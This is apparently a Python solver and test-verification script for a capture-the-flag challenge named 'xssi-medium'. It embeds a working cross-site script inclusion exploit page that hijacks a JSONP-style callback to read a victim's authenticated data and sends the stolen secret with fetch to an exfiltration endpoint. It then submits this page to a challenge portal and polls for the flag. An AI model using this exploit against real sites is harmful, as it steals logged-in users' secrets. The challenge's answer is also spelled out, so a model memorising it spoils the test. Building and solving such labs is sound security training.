#!/usr/bin/env python3
"""
Automated solver / test verification script for xssi-medium (Hardened)
"""
import sys
import time
import requests

PORTAL_URL = "http://127.0.0.1:8000"

EXPLOIT_PAYLOAD = """<!DOCTYPE html>
<html>
<head>
  <title>XSSI Medium Solver</title>
</head>
<body>
  <h1>XSSI Function Interceptor Exploit Running...</h1>
  <script>
    const jobId = new URLSearchParams(window.location.search).get('jobId');

    // Define global callback function before script inclusion to intercept data
    window.renderUserProfile = function(dataArray) {
      console.log('[Exploit] Intercepted arguments:', dataArray);
      if (Array.isArray(dataArray) && dataArray.length > 1) {
        const secret = dataArray[1];
        fetch('http://portal.ctf:8000/exfil?jobId=' + encodeURIComponent(jobId) + '&secret=' + encodeURIComponent(secret));
      }
    };
  </script>
  <!-- Cross-site inclusion of victim authenticated script -->
  <script src="http://victim.ctf:3000/api/userdata.js"></script>
</body>
</html>
"""

def main():
    print(f"[*] Connecting to challenge portal at {PORTAL_URL}...")
    try:
        res = requests.post(
            f"{PORTAL_URL}/submit",
            json={"html": EXPLOIT_PAYLOAD},
            timeout=10
        )
        res.raise_for_status()
        data = res.json()
    except Exception as e:
        print(f"[-] Failed to submit exploit payload: {e}")
        sys.exit(1)

    job_id = data.get("jobId")
    print(f"[+] Exploit submitted successfully. Job ID: {job_id}")
    print("[*] Waiting for bot execution and exfiltration...")

    flag = None
    start_time = time.time()
    while time.time() - start_time < 20:
        time.sleep(1)
        try:
            status_res = requests.get(f"{PORTAL_URL}/status/{job_id}", timeout=5)
            status_data = status_res.json()
            if status_data.get("flag"):
                flag = status_data["flag"]
                break
            if status_data.get("status") == "completed" and not status_data.get("flag"):
                print("[-] Bot finished without successful flag release.")
                break
        except Exception as e:
            print(f"[!] Polling error: {e}")

    if flag:
        print(f"\n[+] SUCCESS! Captured flag: {flag}\n")
        assert flag.startswith("CTF{")
        sys.exit(0)
    else:
        print("[-] Exploit failed to recover the flag.")
        sys.exit(1)

if __name__ == "__main__":
    main()
